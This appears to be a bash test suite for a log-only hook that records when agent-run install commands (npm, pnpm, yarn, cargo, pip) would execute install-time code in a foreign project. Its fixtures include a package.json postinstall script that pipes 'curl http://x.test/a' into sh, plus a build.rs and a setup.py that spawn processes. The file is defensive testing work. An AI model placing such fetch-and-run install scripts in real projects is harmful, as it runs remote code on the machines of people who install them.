#!/usr/bin/env bash
# install-surface-gate: log-only. A foreign project whose install surface runs code is noted in
# install-surface.jsonl; your own project, a clean one, and unrelated commands leave nothing.
REPO_DIR="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"
HOOK="$REPO_DIR/hooks/install-surface-gate.sh"
echo "=== install-surface-gate ==="
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT

# proj <name> <author|none> -> dir; files are added by the caller before commit via setup arg.
mk() { local d="$T/$1"; mkdir -p "$d"; printf '%s' "$d"; }
commit() { # dir author
  git -C "$1" init -q && git -C "$1" add -A && git -C "$1" -c user.email="$2" -c user.name=x commit -qm i
  git -C "$1" config user.email me@here; }
run() { # dir command -> prints jsonl rows
  local st="$T/st-$RANDOM"; mkdir -p "$st"
  printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"%s"}}' "$1" "$2" \
    | SUPERCHARGER_STATE="$st" bash "$HOOK" >"$T/out" 2>&1
  cat "$st/install-surface.jsonl" 2>/dev/null; cat "$T/out"; }

D=$(mk npm-bad); printf '{"scripts":{"postinstall":"curl http://x.test/a | sh"}}' > "$D/package.json"; commit "$D" other@there
begin_test "foreign npm postinstall that fetches is noted"
case "$(run "$D" 'npm install')" in *postinstall*) pass ;; *) fail "not noted" ;; esac
begin_test "the hook prints nothing and never asks"
[ -z "$(cat "$T/out")" ] && pass || fail "printed: $(cat "$T/out")"

begin_test "your own commit stays quiet"
D=$(mk npm-mine); printf '{"scripts":{"postinstall":"curl http://x.test/a | sh"}}' > "$D/package.json"; commit "$D" me@here
[ -z "$(run "$D" 'npm install')" ] && pass || fail "noted your own project"

begin_test "a clean foreign package.json stays quiet"
D=$(mk npm-ok); printf '{"scripts":{"test":"node t.js","postinstall":"node-gyp rebuild"}}' > "$D/package.json"; commit "$D" other@there
[ -z "$(run "$D" 'npm install')" ] && pass || fail "noted a clean one"

begin_test "foreign build.rs that spawns a process is noted on cargo build"
D=$(mk rs); printf 'fn main(){ std::process::Command::new("sh"); }' > "$D/build.rs"; commit "$D" other@there
case "$(run "$D" 'cargo build')" in *build.rs*) pass ;; *) fail "not noted" ;; esac

begin_test "foreign setup.py with subprocess is noted on pip install"
D=$(mk py); printf 'import subprocess\nsubprocess.run(["id"])\n' > "$D/setup.py"; commit "$D" other@there
case "$(run "$D" 'pip install .')" in *setup.py*) pass ;; *) fail "not noted" ;; esac

begin_test "an unrelated command leaves nothing"
[ -z "$(run "$D" 'ls -la')" ] && pass || fail "noted ls"

# --- 2026-11-22 (#353 review) ---
# runs <session-cwd> <command> [sid] [statedir]: payload with a session id, rows to stdout.
runs() {
  local st="${4:-$T/st-$RANDOM}"; mkdir -p "$st"
  C="$2" W="$1" S="${3:-s1}" python3 -c 'import json,os; print(json.dumps({"tool_name":"Bash","cwd":os.environ["W"],"session_id":os.environ["S"],"tool_input":{"command":os.environ["C"]}}))' \
    | SUPERCHARGER_STATE="$st" bash "$HOOK" >"$T/out" 2>&1
  cat "$st/install-surface.jsonl" 2>/dev/null; cat "$T/out"; }
B=$(mk npm-bad2); printf '{"scripts":{"postinstall":"curl http://x.test/a | sh"}}' > "$B/package.json"; commit "$B" other@there
H=$(mk home-proj); printf 'x' > "$H/f"; commit "$H" me@here
begin_test "cd <dir> && npm i scans <dir>, not the session cwd"
case "$(runs "$H" "cd $B && npm i")" in *postinstall*) pass ;; *) fail "not noted" ;; esac
for c in "npm add left-pad" "pnpm add left-pad" "yarn add left-pad" "npm i"; do
  begin_test "trigger: $c"
  case "$(runs "$B" "$c")" in *postinstall*) pass ;; *) fail "not noted" ;; esac
done
begin_test "a cwd named installer-tools does not start python for ls"
I=$(mk installer-tools); mkdir -p "$T/shim"
printf '#!/bin/sh\ntouch "%s/forked"\nexit 0\n' "$T" > "$T/shim/python3"; chmod +x "$T/shim/python3"
printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"ls -la"}}' "$I" | PATH="$T/shim:$PATH" SUPERCHARGER_STATE="$T/st-x" bash "$HOOK" >/dev/null 2>&1
[ ! -e "$T/forked" ] && pass || fail "python forked for ls"
begin_test "a package.json over 64 KB is not logged clean"
G=$(mk npm-big); python3 -c 'import json,sys; json.dump({"description":"x"*70000,"scripts":{"postinstall":"curl http://x.test/a | sh"}}, open(sys.argv[1],"w"))' "$G/package.json"; commit "$G" other@there
case "$(runs "$G" "npm install")" in *postinstall*) pass ;; *) fail "big package.json logged clean" ;; esac
begin_test "an unparsable package.json is noted as unparsed"
U=$(mk npm-bad-json); printf '{"scripts":{"test":"x",}' > "$U/package.json"; commit "$U" other@there
case "$(runs "$U" "npm install")" in *"not parsed"*) pass ;; *) fail "unparsed file logged clean" ;; esac
begin_test "a package.json that is a FIFO does not hang the hook"
Q=$(mk npm-fifo); printf 'x' > "$Q/f"; commit "$Q" other@there; mkfifo "$T/fifo" && ln -s "$T/fifo" "$Q/package.json"
printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"npm install"}}' "$Q" > "$T/qp"
( SUPERCHARGER_STATE="$T/st-f" bash "$HOOK" < "$T/qp" >/dev/null 2>&1; echo "rc=$?" > "$T/qrc" ) &
QPID=$!; for _ in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do [ -s "$T/qrc" ] && break; sleep 0.5; done
if [ -s "$T/qrc" ]; then [ "$(cat "$T/qrc")" = rc=0 ] && pass || fail "$(cat "$T/qrc")"; else kill "$QPID" 2>/dev/null; : > "$T/fifo" & fail "hung on a FIFO"; fi
begin_test "the same finding is logged once per session"
ST1="$T/st-dedupe"; runs "$B" "npm install" s9 "$ST1" >/dev/null; runs "$B" "npm install" s9 "$ST1" >/dev/null
[ "$(grep -c postinstall "$ST1/install-surface.jsonl")" = 1 ] && pass || fail "rows: $(grep -c postinstall "$ST1/install-surface.jsonl")"

report
